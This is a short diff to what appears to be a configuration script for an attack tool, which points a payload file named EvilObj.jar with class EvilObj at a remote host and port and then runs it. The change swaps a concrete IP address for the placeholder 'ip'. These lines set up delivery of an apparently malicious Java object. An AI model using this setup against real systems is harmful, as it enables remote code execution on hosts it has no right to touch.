@@ -6,6 +6,6 @@ set path /EvilObj.jar
 
 set type jar
 set classname EvilObj
-set rhost 129.211.89.169
+set rhost ip
 set rport 8889
 run
